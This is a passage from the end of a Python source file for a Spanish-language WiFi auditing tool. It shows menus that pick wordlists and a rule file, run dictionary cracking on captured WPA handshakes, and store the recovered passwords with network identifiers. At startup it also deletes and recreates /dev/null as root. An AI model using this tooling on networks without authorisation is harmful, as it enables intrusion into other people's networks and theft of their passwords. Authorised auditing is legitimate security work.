                    cprint("  [*] Buscando en otras ubicaciones...", Colors.WARNING)
                    for f in WORK_DIR.glob("*.txt"):
                        if f.is_file() and f.name != "passwords_encontradas.txt":
                            diccionario_files.append(f)

                if not diccionario_files:
                    cprint("\n  [!] No se encontraron diccionarios disponibles.", Colors.FAIL)
                    try:
                        input("\n" + Colors.CYAN + "[*] Presiona Enter para continuar..." + Colors.ENDC)
                    except (EOFError, KeyboardInterrupt):
                        pass
                    continue

                cprint("\n" + Colors.BOLD + "Diccionarios disponibles:" + Colors.ENDC, Colors.CYAN)
                for idx, f in enumerate(diccionario_files, 1):
                    size_kb = f.stat().st_size / 1024
                    cprint("  " + Colors.BOLD + "[" + str(idx) + "]" + Colors.ENDC + " " + f.name + " (" + "{:.1f}".format(size_kb) + " KB)", Colors.BLUE)

                diccionario_path = None
                while True:
                    try:
                        dic_choice = input("\n  " + Colors.WARNING + "[?] Selecciona un diccionario por numero (o 0 para cancelar): " + Colors.ENDC).strip()
                        if dic_choice == '0':
                            cprint("\n  [*] Operacion cancelada.", Colors.BLUE)
                            break
                        try:
                            idx = int(dic_choice)
                            if 1 <= idx <= len(diccionario_files):
                                diccionario_path = str(diccionario_files[idx - 1])
                                break
                        except ValueError:
                            pass
                        cprint("  [!] Opcion invalida. Ingresa un numero del 1 al " + str(len(diccionario_files)) + " o 0 para cancelar.", Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        cprint("\n  [!] Entrada no disponible.", Colors.FAIL)
                        diccionario_path = None
                        break

                if not diccionario_path:
                    continue

                cprint("\n  [*] Diccionario seleccionado: " + Colors.BOLD + diccionario_path + Colors.ENDC, Colors.GREEN)
                password = crack_password_diccionario(hc22000_path, essid, diccionario_path)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '6':
                # ---- SELECCIONAR DICCIONARIO (con regla) ----
                diccionarios_dir = WORK_DIR / "diccionarios"
                diccionario_files = []
                if diccionarios_dir.exists():
                    for ext in ["*.txt", "*.lst", "*.dic", "*.wordlist"]:
                        diccionario_files.extend(list(diccionarios_dir.glob(ext)))
                    for f in diccionarios_dir.iterdir():
                        if f.is_file() and f.suffix == '' and f not in diccionario_files:
                            diccionario_files.append(f)

                if not diccionario_files:
                    cprint("\n  [!] No se encontraron archivos de diccionario en: " + str(diccionarios_dir), Colors.FAIL)
                    cprint("  [*] Buscando en otras ubicaciones...", Colors.WARNING)
                    for f in WORK_DIR.glob("*.txt"):
                        if f.is_file() and f.name != "passwords_encontradas.txt":
                            diccionario_files.append(f)

                if not diccionario_files:
                    cprint("\n  [!] No se encontraron diccionarios disponibles.", Colors.FAIL)
                    try:
                        input("\n" + Colors.CYAN + "[*] Presiona Enter para continuar..." + Colors.ENDC)
                    except (EOFError, KeyboardInterrupt):
                        pass
                    continue

                cprint("\n" + Colors.BOLD + "Diccionarios disponibles:" + Colors.ENDC, Colors.CYAN)
                for idx, f in enumerate(diccionario_files, 1):
                    size_kb = f.stat().st_size / 1024
                    cprint("  " + Colors.BOLD + "[" + str(idx) + "]" + Colors.ENDC + " " + f.name + " (" + "{:.1f}".format(size_kb) + " KB)", Colors.BLUE)

                diccionario_path = None
                while True:
                    try:
                        dic_choice = input("\n  " + Colors.WARNING + "[?] Selecciona un diccionario por numero (o 0 para cancelar): " + Colors.ENDC).strip()
                        if dic_choice == '0':
                            cprint("\n  [*] Operacion cancelada.", Colors.BLUE)
                            break
                        try:
                            idx = int(dic_choice)
                            if 1 <= idx <= len(diccionario_files):
                                diccionario_path = str(diccionario_files[idx - 1])
                                break
                        except ValueError:
                            pass
                        cprint("  [!] Opcion invalida. Ingresa un numero del 1 al " + str(len(diccionario_files)) + " o 0 para cancelar.", Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        cprint("\n  [!] Entrada no disponible.", Colors.FAIL)
                        diccionario_path = None
                        break

                if not diccionario_path:
                    continue

                # Regla fija: solo_2num_sufijo.rule
                rule_path = str(WORK_DIR / "rules" / "solo_2num_sufijo.rule")
                if not os.path.exists(rule_path):
                    cprint("\n  [!] Archivo de regla no encontrado: " + rule_path, Colors.FAIL)
                    try:
                        input("\n" + Colors.CYAN + "[*] Presiona Enter para continuar..." + Colors.ENDC)
                    except (EOFError, KeyboardInterrupt):
                        pass
                    continue

                cprint("\n  [*] Diccionario seleccionado: " + Colors.BOLD + diccionario_path + Colors.ENDC, Colors.GREEN)
                cprint("  [*] Regla seleccionada:      " + Colors.BOLD + rule_path + Colors.ENDC, Colors.GREEN)

                password = crack_password_diccionario_con_regla(hc22000_path, essid, diccionario_path, rule_path)
                if password:
                    try:
                        with open(hc22000_path, 'r') as hf:
                            first_line = hf.readline().strip()
                        parts = first_line.split(':')
                        bssid = parts[2] if len(parts) > 2 else "DESCONOCIDO"
                    except:
                        bssid = "DESCONOCIDO"
                    save_password(essid, bssid, password)
                    cprint("\n  [*] Contrasena encontrada: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
                    try:
                        eliminar = input("\n  " + Colors.WARNING + "[?] Eliminar el archivo .hc22000? (s/N): " + Colors.ENDC).strip().lower()
                        if eliminar == 's':
                            try:
                                os.unlink(hc22000_path)
                                cprint("  [*] Archivo .hc22000 eliminado.", Colors.CYAN)
                            except OSError as e:
                                cprint("  [!] Error al eliminar: " + str(e), Colors.FAIL)
                    except (EOFError, KeyboardInterrupt):
                        pass
                else:
                    cprint("\n  " + Colors.WARNING + "[!] No se pudo descifrar la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
                    cprint("  [*] El archivo .hc22000 se conserva para futuros intentos.", Colors.CYAN)

                try:
                    otra = input("\n" + Colors.WARNING + "[?] Deseas realizar otra operacion? (s/N): " + Colors.ENDC).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    otra = 'n'
                if otra != 's':
                    cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                    return

            elif sub_choice == '7':
                cprint("\n  [*] Volviendo a seleccion de archivo...", Colors.BLUE)
                break  # Sale del submenu, vuelve al outer loop (seleccionar archivo)

            elif sub_choice == '8':
                cprint("\n  [*] Regresando al menu principal...", Colors.BLUE)
                return

            else:
                cprint("  [!] Opcion invalida. Debe ser 1, 2, 3, 4, 5, 6, 7 u 8.", Colors.FAIL)
                continue


# =============================================================================
# MAIN
# =============================================================================

def main():
    global _mon_interface_global

    signal.signal(signal.SIGINT, signal_handler)

    cprint(f"""
{Colors.HEADER}+============================================================+
|{Colors.BLUE}               WIFI AUDIT TOOL  v1.0              {Colors.HEADER}|
|{Colors.BLUE}      Auditoria automatizada de redes WiFi        {Colors.HEADER}|
+============================================================+{Colors.ENDC}
""")

    check_root()

    # Reparar /dev/null si fue corrupto (permisos incorrectos, etc.)
    try:
        subprocess.run(['rm', '-f', '/dev/null'], capture_output=True, timeout=5)
        subprocess.run(['mknod', '-m', '666', '/dev/null', 'c', '1', '3'], capture_output=True, timeout=5)
    except Exception:
        pass

    check_dependencies()

    while True:
        opcion = show_menu()

        if opcion == 1:
            menu_capturar_handshake()

        elif opcion == 2:
            menu_descifrar_password()

        elif opcion == 3:
            cprint(f"\n  {Colors.BOLD}[*] Saliendo del programa...{Colors.ENDC}", Colors.GREEN)
            break

    # Limpieza final
    if _mon_interface_global:
        stop_monitor_mode(_mon_interface_global)
    show_summary()


if __name__ == "__main__":
    main()